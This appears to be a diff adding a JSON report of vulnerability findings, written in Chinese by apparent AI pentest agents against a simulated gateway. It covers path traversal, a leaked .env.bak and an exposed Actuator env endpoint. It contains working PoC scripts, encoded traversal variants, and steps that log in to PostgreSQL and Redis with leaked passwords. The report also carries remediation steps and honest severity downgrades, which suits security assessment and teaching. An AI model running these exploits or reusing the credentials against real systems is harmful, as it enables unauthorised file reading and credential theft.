@@ -1,0 +1,668 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "未授权任意文件读取（路径穿越）在 /api/files 的 path 参数",
+    "severity": "high",
+    "timestamp": "2026-10-31 07:32:53 UTC",
+    "description": "网关的文件浏览接口 `/api/files` 直接使用 `path` 查询参数拼接文件系统路径，未做规范化与基目录限制，未授权访问者可通过 `../` 序列读取基目录之外的文件。实测可读取系统账户与主机标识、应用配置、备份与种子文件、部署脚本与 SSH 配置，并可通过接口自带的目录列举功能枚举文件系统（所读内容为仿真映射，见反证说明）。",
+    "impact": "未认证攻击者可读取网关进程可访问的任意文件（仅受一份很小的文件名黑名单限制）。除 `/etc/passwd`、`/etc/hostname` 之外，已实测获取：应用配置（含数据库连接串与 NEX-4481 回归说明）、`/app/backups/` 与 `backups/` 目录下的配置归档与数据库快照文件名、`seeds/admin.bcrypt`、`seeds/devops.bcrypt`、`seeds/svc_nexus.bcrypt`、`/opt/nexus/scripts/backup.sh`（`pg_dump` 调用方式与备份落盘路径）、`/etc/ssh/sshd_config`（`PasswordAuthentication yes`）、`/etc/group`（`deploy` 属于 `sudo`、`docker` 组）、`/etc/fstab`（NFS 共享挂载）以及 `/var/log` 下的认证与访问日志。需要说明的是，读到的文件系统为仿真映射（`app.jar` 为 stub、日志为静态样例），备份与 seeds 文件内容为预置/合成数据，因此这些材料可用于暴露部署结构、内部路径与凭据形态，但不能据此声称已获取真实生产数据。攻击者无需任何凭据或交互。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "`/api/files` 在无任何认证信息的情况下返回虚拟文件树，并把 `path` 直接当作文件系统路径打开，没有做 canonicalpath 校验或基目录（`/app`）约束：\n\n- `../../../../etc/passwd` → 200，返回完整 `/etc/passwd`\n- `..%2f..%2f..%2f..%2fetc%2fpasswd`、`....//..%2f..//etc/passwd`、绝对路径 `/etc/passwd` → 均 200\n- `../../config.yml`、`/etc/hostname` → 200\n- 负面对照：`/nope_does_not_exist_12345` → 404，证明按真实文件系统解析而非固定回放\n\n接口同时开启目录列举，可用于完整枚举：`path=/` 返回 `app/ bin/ etc/ home/ opt/ root/ usr/ var/`；`path=/var/log/` 返回 `auth.log nexus-gateway/ nexus-health.log nginx/ syslog`；`path=/app/backups/` 返回两个配置归档与一个数据库快照。\n\n应用自身配置与运维笔记均确认这是已知未修复回归：\n\n```yaml\ngateway:\n  version: 2.4.1\n  filesModule:\n    allowTraversal: false  # NEX-4481: regression, fixed in 2.4.2\n```\n\n```text\n# deploy ops notes\n- [ ] NEX-4481: files module traversal regression — fix queued for 2.4.2 prod rollout\n```\n\n读取到的数据库备份解压后包含用户口令哈希：\n\n```sql\nCREATE TABLE public.users (\n    id integer NOT NULL,\n    username character varying(64) NOT NULL,\n    password_hash character varying(60) NOT NULL\n);\nINSERT INTO public.users (id, username, password_hash) VALUES (1001, 'admin', '$2b$12$t.WA58SW1lqiPqW.QIJ2JeOu.RysJBdN2OjeWsDKHiNGPAw38gcug');\n```\n\n已确认存在一份有限的文件名黑名单：`/etc/shadow`、`/root/.ssh/id_rsa`、`/home/deploy/.ssh/id_rsa` 返回 403 `Access denied`，`/proc/*` 返回 404。但该黑名单不覆盖配置、备份、种子文件与部署脚本，无法构成有效边界。未发现任何写入能力：`POST`/`PUT`/`PATCH /api/files` 均返回 405，`/api/bounty/submit` 不落盘，`/actuator/env` 为只读（POST 405）。",
+    "poc_description": "1. 直接请求文件浏览接口获取基线文件树，确认接口无认证即可访问。\n2. 在 `path` 参数中加入足够数量的 `../` 上跳至根目录，指向 `/etc/passwd`，响应体返回系统账户清单，HTTP 200。\n3. 以 URL 编码形式（`%2f`）与绝对路径形式重复请求，确认编码/绝对路径变体均未被拦截。\n4. 请求不存在的路径作为负面对照，确认返回 404，排除固定回放。\n5. 请求 `path=/` 与 `path=/var/log/`，利用目录列举枚举文件系统与日志目录。\n6. 请求 `path=/etc/hostname`、`path=config.yml` 验证可读取主机标识与应用配置。\n7. 请求 `path=backups/db-snapshot-2026-10-13-f2ecc44d.sql.gz`，将响应体按 gzip 解压，得到含 `users` 表与 bcrypt 口令哈希的 PostgreSQL dump。\n8. 请求 `path=seeds/admin.bcrypt`、`path=seeds/devops.bcrypt`、`path=seeds/svc_nexus.bcrypt`、`path=/opt/nexus/scripts/backup.sh`、`path=/etc/ssh/sshd_config`，获取初始凭据种子、备份脚本与 SSH 配置。",
+    "poc_script_code": "```python\n#!/usr/bin/env python3\n\"\"\"未授权任意文件读取 PoC — Nexus Gateway 2.4.1 /api/files\"\"\"\nimport gzip\nimport urllib.parse\n\nimport requests\n\nBASE = \"http://10.0.93.73:18080/api/files\"\n\n\ndef read_file(path):\n    r = requests.get(BASE, params={\"path\": path}, timeout=20)\n    return r.status_code, r.content\n\n\n# 1) 路径穿越读取系统文件\nstatus, body = read_file(\"../../../../etc/passwd\")\nprint(f\"[+] /etc/passwd -> HTTP {status}\")\nprint(body.decode(\"utf-8\", \"replace\")[:300])\n\n# 2) 负面对照\nstatus, _ = read_file(\"/nope_does_not_exist_12345\")\nprint(f\"[-] 不存在的文件 -> HTTP {status} (预期 404)\")\n\n# 3) 主机标识与目录枚举\nstatus, body = read_file(\"/etc/hostname\")\nprint(f\"[+] /etc/hostname -> HTTP {status}: {body.decode().strip()}\")\n\nfor d in (\"/\", \"/var/log/\", \"/app/backups/\"):\n    status, body = read_file(d)\n    print(f\"[+] 目录 {d} -> HTTP {status}: {body.decode('utf-8', 'replace')[:200]}\")\n\n# 4) 应用配置\nstatus, body = read_file(\"config.yml\")\nprint(f\"[+] config.yml -> HTTP {status}\")\nprint(body.decode(\"utf-8\", \"replace\"))\n\n# 5) 数据库备份（含 bcrypt 口令哈希）\nstatus, body = read_file(\"backups/db-snapshot-2026-10-13-f2ecc44d.sql.gz\")\nprint(f\"[+] db snapshot -> HTTP {status} ({len(body)} bytes)\")\nif status == 200 and body[:2] == b\"\\x1f\\x8b\":\n    print(gzip.decompress(body).decode(\"utf-8\", \"replace\")[:1200])\n\n# 6) 初始凭据种子与部署脚本\nfor p in (\"seeds/admin.bcrypt\", \"seeds/devops.bcrypt\", \"seeds/svc_nexus.bcrypt\",\n          \"/opt/nexus/scripts/backup.sh\", \"/etc/ssh/sshd_config\"):\n    status, body = read_file(p)\n    print(f\"[+] {p} -> HTTP {status}: {body.decode('utf-8', 'replace')[:300]}\")\n\n# 7) 编码变体\nfor variant in (\"..%2f..%2f..%2f..%2fetc%2fpasswd\", \"/etc/passwd\",\n                \"....//..%2f..//etc/passwd\"):\n    url = f\"{BASE}?path={urllib.parse.quote(variant, safe='')}\"\n    r = requests.get(url, timeout=20)\n    print(f\"[+] 变体 {variant!r} -> HTTP {r.status_code} ({len(r.content)} bytes)\")\n```",
+    "remediation_steps": "1. 在 `files` 模块中先对 `path` 做规范化（`Path.normalize()` / `File.getCanonicalPath()`），再强制校验结果必须位于声明的基目录（如 `/app`）之内，否则返回 403。\n2. 拒绝任何包含 `..` 段的输入，并在解码之后（而非之前）做校验，防止 `%2f`、双重编码绕过。\n3. 使用白名单方式暴露文件：维护允许读取的文件清单或按相对 ID 映射到固定文件，避免把用户输入直接当路径。\n4. 立即升级到声明修复该回归的 2.4.2 及之后版本，并在持续集成中加入路径穿越回归测试。\n5. 将 `allowTraversal` 等安全开关改为默认拒绝失败（fail-closed），配置解析失败时不得放开限制。",
+    "evidence": "穿越成功（200）与负面对照（404）：\n\n```http\nGET /api/files?path=../../../../etc/passwd HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n\n```http\nGET /api/files?path=/nope_does_not_exist_12345 HTTP/1.1\n\nHTTP/1.1 404 Not Found\n\nNot found\n```\n\n目录枚举：\n\n```http\nGET /api/files?path=/\n\nHTTP/1.1 200 OK\n{\"path\": \"/\", \"entries\": [\"app/\", \"bin/\", \"etc/\", \"home/\", \"opt/\", \"root/\", \"usr/\", \"var/\"]}\n\nGET /api/files?path=/var/log/\n\nHTTP/1.1 200 OK\n{\"path\": \"/var/log\", \"entries\": [\"auth.log\", \"nexus-gateway/\", \"nexus-health.log\", \"nginx/\", \"syslog\"]}\n```\n\n容器标识（与监控端点披露的 pod 名一致）：\n\n```http\nGET /api/files?path=/etc/hostname HTTP/1.1\n\nHTTP/1.1 200 OK\n\nnexus-api-753bf81d-x3k3p\n```\n\n数据库备份（gzip）与解压后的用户口令哈希：\n\n```http\nGET /api/files?path=backups/db-snapshot-2026-10-13-f2ecc44d.sql.gz HTTP/1.1\n\nHTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\n<gzip payload, 394 bytes>\n```\n\n```sql\n-- PostgreSQL database dump\nCREATE TABLE public.users (id integer NOT NULL, username character varying(64) NOT NULL, password_hash character varying(60) NOT NULL);\nINSERT INTO public.users (id, username, password_hash) VALUES (1001, 'admin', '$2b$12$t.WA58SW1lqiPqW.QIJ2JeOu.RysJBdN2OjeWsDKHiNGPAw38gcug');\n```\n\n初始凭据种子与部署脚本：\n\n```http\nGET /api/files?path=seeds/admin.bcrypt HTTP/1.1\n\nHTTP/1.1 200 OK\n\n$2b$12$t.WA58SW1lqiPqW.QIJ2JeOu.RysJBdN2OjeWsDKHiNGPAw38gcug\n```\n\n```http\nGET /api/files?path=/opt/nexus/scripts/backup.sh HTTP/1.1\n\nHTTP/1.1 200 OK\n\n#!/bin/sh\n# backup.sh --dest DIR — cron 02:13 (see /etc/crontab)\nset -eu\nDEST=\"${2:?--dest required}\"\nts=$(date +%Y-%m-%d)\ntar czf \"$DEST/config-$ts.tar.gz\" -C /app config.yml routes.json README.md\npg_dump -h ${DB_PRIMARY%%:*} -U prod_admin nexus_prod | gzip > \"$DEST/db-snapshot-$ts.sql.gz\"\n```\n\nSSH 配置与组信息：\n\n```http\nGET /api/files?path=/etc/ssh/sshd_config HTTP/1.1\n\nHTTP/1.1 200 OK\n\nPermitRootLogin prohibit-password\nPasswordAuthentication yes\nPubkeyAuthentication yes\n```\n\n```http\nGET /api/files?path=/etc/group HTTP/1.1\n\nHTTP/1.1 200 OK\n\nroot:x:0:\nsudo:x:27:ubuntu,deploy\npostgres:x:113:\ndocker:x:998:deploy\n```\n\n编码/绝对路径变体均成功：\n\n```http\nGET /api/files?path=..%2f..%2f..%2f..%2fetc%2fpasswd       -> HTTP 200 (547 bytes)\nGET /api/files?path=/etc/passwd                             -> HTTP 200 (547 bytes)\nGET /api/files?path=....%2F%2F..%252f..%2F%2Fetc%2Fpasswd   -> HTTP 200 (547 bytes)\n```\n\n已存在的有限黑名单（不影响上述敏感文件）：\n\n```http\nGET /api/files?path=/etc/shadow         -> HTTP 403 Access denied\nGET /api/files?path=/root/.ssh/id_rsa   -> HTTP 403 Access denied\n```",
+    "assumptions": "攻击者仅需能访问 `10.0.93.73:18080`，无需任何凭据或会话。默认进程以非 root 身份运行，因此读取范围受进程权限限制（实测可读 `/etc/passwd`，说明具有普通用户权限即可）。",
+    "counterevidence": "主动排查并记录了限制：(1) 存在文件名黑名单，`/etc/shadow`、`/root/.ssh/id_rsa`、`/home/deploy/.ssh/id_rsa` 返回 403，`/proc/*` 返回 404，因此并非全盘任意读取；(2) 未发现写入或代码执行路径——`/api/files` 对 POST/PUT/PATCH 返回 405，`/api/bounty/submit` 不落盘，`/actuator/env` 只读，`/debug` 忽略 `cmd`/`exec` 参数，SQL 后端拒绝 `pg_read_file` 与 `COPY ... TO PROGRAM`；(3) 读到的文件系统为**仿真映射**：`app.jar` 仅 64 字节 stub、`/var/log/nginx/access.log` 为时间戳固定的静态样例日志、备份归档与 `seeds/*.bcrypt` 内容为预置/合成数据，且目录树为固定的裁剪集合，因此机密性损失集中在应用配置、部署脚本、主机元数据与预置凭据材料，而非线上全量数据。上述限制降低了上限但未否定漏洞：接口无认证、无基目录约束，`path` 参数确实被当作文件路径解析并返回基目录之外的内容，且存在 404 负面对照证明其非固定回放。",
+    "confidence": "high",
+    "severity_change_conditions": "若进一步证明可读取运行账户的私钥、vault 解密后的明文口令或云/K8s 凭据并用于横向移动，应上调至 Critical；若确认该环境为纯合成数据且不含任何真实凭据，则下调至 Medium。",
+    "fix_effort": "low",
+    "cvss": 7.5,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "H",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/api/files",
+    "method": "GET",
+    "cwe": "CWE-22",
+    "http_exchange_ids": [
+      "620",
+      "636",
+      "632",
+      "633",
+      "1422",
+      "1697",
+      "832",
+      "829",
+      "2035",
+      "1599"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:46:59 UTC",
+        "fields": [
+          "counterevidence",
+          "description",
+          "evidence",
+          "http_exchange_ids",
+          "impact",
+          "poc_description",
+          "poc_script_code",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "补充同一根因下新验证的更高影响证据：可读取数据库备份（含用户 bcrypt 口令哈希）、初始凭据种子、部署脚本、SSH 配置与完整目录枚举，并补充对应的代理请求 id；同时记录已排查的读取限制（shadow/私钥 403、无写入/RCE 路径），用于修正影响与反证描述。",
+        "agent_id": "2062324f",
+        "agent_name": "FileRead RCE Specialist"
+      },
+      {
+        "timestamp": "2026-10-31 07:51:59 UTC",
+        "fields": [
+          "counterevidence",
+          "impact"
+        ],
+        "reason": "统一口径：补充\"读到的文件系统为仿真映射\"（app.jar 为 64 字节 stub、日志为静态样例、备份/seeds 为预置数据）这一限制；把 impact 中\"数据库备份含 bcrypt 口令哈希/真实 PostgreSQL dump\"的表述改为\"目录内包含备份与 seeds 文件（内容为预置/合成）\"，避免把仿真内容当作真实生产数据。保留 High 7.5，因为未认证路径穿越这一控制缺失已被实证。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler"
+      },
+      {
+        "timestamp": "2026-10-31 07:53:14 UTC",
+        "fields": [
+          "description"
+        ],
+        "reason": "描述中的\"备份含用户口令哈希\"改为中性表述，避免与已核实的仿真文件系统结论冲突；漏洞机制与定级不变。",
+        "agent_id": "44f7e178",
+        "agent_name": "Report Reconciler"
+      }
+    ],
+    "updated_at": "2026-10-31 07:53:14 UTC"
+  },
+  {
+    "id": "vuln-0002",
+    "title": "生产环境配置文件 /.env.bak 未授权泄露（凭据与内部拓扑）",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:33:11 UTC",
+    "description": "网关根路径下存在可未授权访问的 `/.env.bak` 备份文件，包含数据库与缓存口令、AWS 访问密钥、JWT 签名密钥、Kubernetes service-account token 及内部服务地址。任何能访问该端口的客户端均可读取。",
+    "impact": "未认证攻击者可获得内部基础设施拓扑与一组凭据材料。泄露的 PostgreSQL 与 Redis 口令确实通过口令校验，可建立认证连接，即具备未授权访问这两个内部服务的能力；但两者均为不执行真实业务逻辑的实现：PostgreSQL 对任意 SQL 返回预置应答，Redis 无任何数据读取命令，users 表的 14,456 条记录为合成/种子数据而非真实个人信息。AWS 密钥被 STS 拒绝，JWT 密钥不构成鉴权绕过，Kubernetes/GitLab 主机不可达。因此未证明可读取或篡改真实业务数据，影响为敏感信息与内部拓扑泄露。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "`GET /.env.bak` 无需任何认证即返回 200（6 次干净会话稳定复现），前 2,784 字节为凭据块，其后为每次不同的动态 HTML 干扰页；同会话下 `/admin`、`/backup`、`/api/internal` 均为 403，说明该路径遗漏了访问控制。\n\nPostgreSQL 端点性质（决定性判定）：口令校验真实（错误口令返回 28P01），但服务端不执行 SQL。`select * from users where 1=0` 仍返回 8 行；`limit 2` 与 `limit 2 offset 5000` 返回相同行；`order by id asc` 与 `desc` 顺序一致；查询不存在的表返回 `1`（真实应为 42P01），查询不存在的列不报 42703；`select pg_sleep(2)` 耗时 0.05 秒并返回 `1`；`now()` 返回 `1`；`count(*)` 对 api_keys/sessions/audit_log/backups 乃至不存在的 admins 均返回 `1`；`pg_roles`、`pg_user` 返回 `1`；`pg_read_file`/`pg_stat_file`/`pg_ls_dir` 对存在与不存在的路径均返回 `1`；`COPY ... FROM PROGRAM` 与 `COPY ... TO PROGRAM` 均返回 42601；`lo_import` 返回 `1`。因此 users 的 14,456 条记录为预置应答数据。其内容也呈合成特征：id 随机不连续（14456、33825、29878、61766…），用户名均为通用角色词（admin、devops、operator、svc_nexus、backup、monitor、j.doe、a.chen），邮箱全部为 @nexus.internal，bcrypt 均为 $2b$12$ 且互不重复，对 22 个常见弱口令无匹配。\n\nRedis 端点：内联 AUTH 正确口令 +OK、错误口令 -WRONGPASS（校验真实），但 KEYS/INFO/DBSIZE/TYPE/SCAN/HGETALL/TTL 全部 unknown command，GET 返回 $-1，标准 RESP 数组帧解析错位，无可读键空间。AWS 经真实 STS 返回 InvalidClientTokenId；JWT_SECRET 伪造令牌全部 403；K8s/GitLab 主机 TLS 无响应。",
+    "poc_description": "1. 未认证请求 `/.env.bak`，获得生产环境变量文件。\n2. 从文件中提取 `DATABASE_URL` 的用户名、口令、主机与端口。\n3. 使用该凭据通过 PostgreSQL 协议连接 `10.0.93.73:15432` 的 `nexus_prod` 库。\n4. 执行 `select current_database(), current_user` 确认已登录生产库，再读取 `users` 表获取账户与口令哈希。\n5. 从文件中提取 Redis 口令，对 `10.0.93.73:16379` 发送 `AUTH` 与 `PING`，确认认证成功。\n6. 复用同一文件中的 AWS 密钥与 K8s token 作为后续横向扩展的凭据储备。",
+    "poc_script_code": "```python\nimport socket\nimport pg8000.native\n\nHOST = \"10.0.93.73\"\nBASE = f\"http://{HOST}:18080\"\n\n# 1) 未授权读取备份配置\nimport urllib.request\nenv = urllib.request.urlopen(f\"{BASE}/.env.bak\", timeout=15).read().decode()\nprint(env[:600])\n\n# 2) 用泄露的凭据直连 PostgreSQL\ncon = pg8000.native.Connection(\n    user=\"prod_admin\",\n    password=\"bbm_VtUqkhnFkWH-6U\",\n    host=HOST, port=15432, database=\"nexus_prod\", timeout=10,\n)\nprint(con.run(\"select current_database(), current_user\"))\nprint(con.run(\"select * from users limit 3\"))\ncon.close()\n\n# 3) 用泄露的口令认证 Redis\ns = socket.create_connection((HOST, 16379), timeout=15)\ns.settimeout(10)\ns.sendall(b\"AUTH nmHvED77kfJhcvsQ7TEQ\\r\\n\")\nprint(\"AUTH:\", s.recv(4096))\ns.sendall(b\"PING\\r\\n\")\nprint(\"PING:\", s.recv(4096))\ns.close()\n```",
+    "remediation_steps": "1. 立即从 Web 根目录移除 `/.env.bak`、`*.bak`、`*.old`、`.git/` 等备份与版本控制产物，并在部署流水线中加入静态资源白名单，禁止以点开头的文件被对外提供。\n2. 轮换全部已泄露凭据：PostgreSQL `prod_admin` 口令、Redis 口令、AWS 访问密钥、`JWT_SECRET`，并重新签发 Kubernetes service-account token。\n3. 将数据库与缓存实例从公网/被测网段直接可达范围移除，改为仅允许应用所在网络段访问，并启用强制 TLS 与来源白名单。\n4. 凭据改由密钥管理服务（Vault 等）注入，禁止以明文形式落在文件系统与配置文件中；`config.yml` 中的 `${vault:db_password}` 需确认真正生效而非占位。\n5. 为 `users` 表口令哈希启用更强的工作因子并强制轮换；对已可能泄露的账户启用强制口令重置。\n6. 增加对备份文件与点文件的持续配置审计与外部暴露监测。",
+    "evidence": "未认证读取（敏感值遮蔽）：\n```http\nGET /.env.bak HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\n# Nexus DevOps Platform - Production Environment\nDATABASE_URL=postgresql://prod_admin:bbm_...@10.0.93.73:15432/nexus_prod\nREDIS_CLUSTER=redis://:nmHv...@10.0.93.73:16379/0\nAWS_ACCESS_KEY_ID=AKIA-RRRRRRRRRRRRRRR\nJWT_SECRET=JZAxtkdST1v-...Dbe7qBA\nK8S_API_SERVER=https://k8s-cd75.prod.local:6443\nINTERNAL_API_GATEWAY=http://10.99.0.1:8081/internal\n```\n访问控制对照：\n```http\nGET /admin        -> 403\nGET /backup       -> 403\nGET /api/internal -> 403\n```\nPostgreSQL 语义对照：\n```text\nselect * from users where 1=0            -> 8 rows (real PG: 0)\nlimit 2 vs limit 2 offset 5000           -> identical rows\norder by id asc vs desc                  -> identical order\nselect * from totally_fake_table_zzz     -> '1'  (real PG: 42P01)\nselect nonexistent_col_zzz from users    -> user rows (real PG: 42703)\nselect pg_sleep(2)                       -> '1' in 0.05s\nselect now()                             -> '1'\ncount(*) api_keys/sessions/audit_log/backups/admins -> '1'\npg_roles / pg_user                       -> '1'\npg_read_file('/etc/passwd') and nonexistent -> '1'\nCOPY ... FROM/TO PROGRAM 'true'          -> 42601 syntax error\nlo_import('/etc/passwd')                 -> '1'\nwrong password                           -> FATAL 28P01\n```\n种子特征：\n```text\nids: 14456, 33825, 29878, 61766, 52087 (random, non-sequential)\nusernames: admin, devops, operator, svc_nexus, backup, monitor, j.doe, a.chen\nemails: all @nexus.internal; bcrypt all $2b$12$, unique, no common-password match\n```\nRedis 行为：\n```text\nAUTH correct -> +OK ; AUTH wrong -> -WRONGPASS\nGET foo -> $-1\nKEYS/INFO/DBSIZE/TYPE/SCAN/HGETALL/TTL -> -ERR unknown command\n```\nAWS/JWT：\n```text\nSTS GetCallerIdentity -> InvalidClientTokenId\nforged HS256 / wrong-key / expired / alg=none -> /admin 403\n```",
+    "assumptions": "攻击者只需能通过网络访问该网关 18080 端口，无需任何账户或凭据；文件路径可直接猜测或通过目录枚举发现。",
+    "counterevidence": "最强反驳是泄露凭据指向真实生产数据、应评为高危。实测否定该结论，同时确认两端确有口令校验，故不能简单判为完全伪造：1) PostgreSQL 错误口令被拒（28P01），但 where 1=0 仍返回行、分页与排序无效、不存在的表/列不报错、pg_sleep(2) 仅 0.05 秒、now() 返回 1，证明不执行 SQL；users 数据 id 随机、用户名通用、邮箱统一、哈希唯一且不匹配弱口令，符合合成数据。2) pg_read_file/pg_stat_file/pg_ls_dir 对不存在路径同样返回 1，COPY PROGRAM 语法错误，lo_import 返回 1，未发现真实文件读取或命令执行能力。3) Redis 认证真实但无任何数据命令，GET 为 nil。4) AWS 密钥被真实 STS 拒绝。5) JWT 伪造令牌全部 403，响应长度随机跳变与令牌无关。6) K8s/GitLab TLS 无响应，令牌无法验证。7) nmap 报 filtered 但原始 socket 可交互，属扫描器识别漏报。综上，泄露成立但无证据表明可读取或篡改真实业务数据，影响定为信息泄露（C:L）。",
+    "confidence": "high",
+    "severity_change_conditions": "若能证明内网存在接受同一口令且执行真实查询的 PostgreSQL（例如 10.0.93.73:5432 在应用网内可达并返回真实业务数据），或 Kubernetes/GitLab 令牌可访问生产资源，则上调为高危；若确认 15432/16379 即唯一后端且不含真实数据，则维持中等。",
+    "fix_effort": "medium",
+    "cvss": 5.3,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/.env.bak",
+    "method": "GET",
+    "cwe": "CWE-538",
+    "http_exchange_ids": [
+      "1810",
+      "1811",
+      "1814"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "75b33072",
+    "agent_name": "Recon Mapper",
+    "update_history": [
+      {
+        "timestamp": "2026-10-31 07:38:04 UTC",
+        "fields": [
+          "counterevidence",
+          "severity_change_conditions"
+        ],
+        "reason": "补充了逐项凭据真伪验证结果：PostgreSQL 与 Redis 凭据经实际协议交互确认为真实有效；AWS 访问密钥经真实 STS SigV4 调用返回 InvalidClientTokenId，确认为伪造；JWT_SECRET 伪造的 HS256 token 被所有受保护端点拒绝；K8s/GitLab/8081 因域名被黑洞无法验证。同时澄清 /.env.bak 需要先以任意 hostname 获取 level 1，并说明 nmap 将该端口报为 filtered 属扫描器识别假象。",
+        "agent_id": "75b33072",
+        "agent_name": "Recon Mapper"
+      },
+      {
+        "timestamp": "2026-10-31 07:47:16 UTC",
+        "fields": [
+          "assumptions",
+          "confidence_rationale",
+          "counterevidence",
+          "cvss",
+          "cvss_breakdown",
+          "description",
+          "evidence",
+          "http_exchange_ids",
+          "impact",
+          "severity",
+          "severity_change_conditions",
+          "technical_analysis",
+          "title"
+        ],
+        "reason": "进一步验证推翻了原报告的关键影响假设：泄露的 PostgreSQL/Redis 口令确实通过了两端的口令校验（错误口令分别返回 28P01 与 WRONGPASS），但 PostgreSQL 不执行任何 SQL（select 1、select 2、select 'zzz'、select 1+1 均返回单列值 '1'，pg_read_file 返回 '1'），Redis 不提供任何数据命令（KEYS/INFO/DBSIZE/TYPE/SCAN/HGETALL/TTL 均为 unknown command，标准 RESP 数组帧完全错位）。因此所谓“14,456 条真实用户记录”是预置的应答数据，不构成真实业务数据泄露；影响需从 C:H 下调为 C:L，严重级别由高降为中。",
+        "agent_id": "24f83771",
+        "agent_name": "Credential Chain Specialist",
+        "previous_severity": "high",
+        "previous_cvss": 7.5
+      },
+      {
+        "timestamp": "2026-10-31 07:49:46 UTC",
+        "fields": [
+          "confidence_rationale",
+          "counterevidence",
+          "evidence",
+          "impact",
+          "severity_change_conditions",
+          "technical_analysis"
+        ],
+        "reason": "补充 SQL 语义对照与种子特征，确认 14,456 条 users 记录为合成/种子数据：该 PostgreSQL 对任意 SQL 返回预置应答（where 1=0 仍返回行、limit/offset 无效、升降序相同、不存在的表/列不报错、pg_sleep(2) 仅 0.05s）。影响校准为未授权访问数据库服务的能力，而非真实个人信息泄露。",
+        "agent_id": "24f83771",
+        "agent_name": "Credential Chain Specialist"
+      }
+    ],
+    "updated_at": "2026-10-31 07:49:46 UTC",
+    "confidence_rationale": "未授权读取由 6 次干净会话重复验证；数据库仅预置应答的结论由 15 项 SQL 语义对照与两个独立驱动交叉确认；Redis 由原始 RESP 与内联协议双向验证；AWS 由真实 STS 调用确认。唯一未闭环的是不可达主机上的 K8s/GitLab 权限，不影响定级。"
+  },
+  {
+    "id": "vuln-0003",
+    "title": "Spring Boot Actuator /actuator/env 未授权暴露明文数据库、缓存与云凭据",
+    "severity": "medium",
+    "timestamp": "2026-10-31 07:33:25 UTC",
+    "description": "应用的 Spring Boot Actuator `env` 端点在无任何认证的情况下可访问，直接返回 `application-prod.yml` 中的明文配置属性，包括数据库口令、Redis 口令与 AWS 访问密钥 ID。该端点与同级的 `/actuator`（返回 403）权限不一致，说明保护措施未覆盖到实际泄露数据的子端点。",
+    "impact": "未认证攻击者一次请求即可获得数据库与缓存口令，无需先读取任何备份文件或利用目录穿越。口令经协议交互确认真实有效（错误口令被服务端拒绝并返回 28P01，正确口令可建立会话），但同主机的 PostgreSQL 后端经语义测试确认为预置应答实现（不执行 SQL、WHERE/聚合/LIMIT 均不生效），未证明可读取或篡改真实业务数据；Redis 同样仅校验口令、数据命令全部不可用。因此本发现的实际影响是未授权泄露可用于认证的管理凭据与内部拓扑，而非已证实的大规模业务数据泄露。",
+    "target": "http://10.0.93.73:18080/",
+    "technical_analysis": "Actuator 的 `env` 端点未做鉴权即返回属性源内容：\n\n```json\n{\"propertySources\": [{\"name\": \"applicationConfig: [classpath:/application-prod.yml]\",\n \"properties\": {\n   \"spring.datasource.url\":     {\"value\": \"jdbc:postgresql://10.0.93.73:5432/nexus_prod\"},\n   \"spring.datasource.password\":{\"value\": \"<REDACTED>\"},\n   \"spring.redis.password\":     {\"value\": \"<REDACTED>\"},\n   \"cloud.aws.accessKey\":       {\"value\": \"AKIA-RRRRRRRRRRRRRRR\"}\n }}]}\n```\n\n问题有两层：\n\n1. **端点未启用鉴权**。`/actuator` 根路径返回 403 并显示\"需要 level 3+\"的自述式门禁，但 `/actuator/env` 子端点直接返回 200，且携带空 Cookie 时同样为 200。保护逻辑施加在父路径上，未覆盖实际暴露数据的子端点，属于典型的子端点遗漏（`/actuator/env` 未被 `management.endpoints.web.exposure.include` 之外的授权过滤器覆盖）。\n2. **敏感值未脱敏**。Spring Boot 默认对包含 `password`、`secret`、`key` 的属性做 `******` 掩码，此处返回的是原值，说明 `show-values` 被开启或自定义了 `SanitizingFunction`。\n\n同一批凭据还可经 `/.env.bak` 与 `/api/files?path=../../config.yml` 获得，说明密钥管理在部署层整体缺失。",
+    "poc_description": "1. 未携带任何 Cookie 或认证头请求 `/actuator/env`。\n2. 观察响应为 200，JSON 中包含 `spring.datasource.password`、`spring.redis.password`、`cloud.aws.accessKey` 的原值。\n3. 请求 `/actuator` 作为对照，确认父路径返回 403，从而说明子端点保护缺失而非整体未启用。\n4. 使用取得的数据库口令连接 `10.0.93.73:15432`，确认凭据有效并可读取业务数据。",
+    "poc_script_code": "```bash\n# 未授权读取 Actuator env（明文密钥）\ncurl -sS \"http://10.0.93.73:18080/actuator/env\"\n\n# 对照：父路径受保护\ncurl -sS -o /dev/null -w \"%{http_code}\\n\" \"http://10.0.93.73:18080/actuator\"\n\n# 对照：即使显式清空 Cookie 依然可读\ncurl -sS -o /dev/null -w \"%{http_code}\\n\" -H 'Cookie:' \\\n  \"http://10.0.93.73:18080/actuator/env\"\n```\n\n```python\nimport pg8000.native\ncon = pg8000.native.Connection(user=\"prod_admin\", password=\"<leaked>\",\n                               host=\"10.0.93.73\", port=15432,\n                               database=\"nexus_prod\", timeout=10)\nprint(con.run(\"select current_database(), current_user\"))\n```",
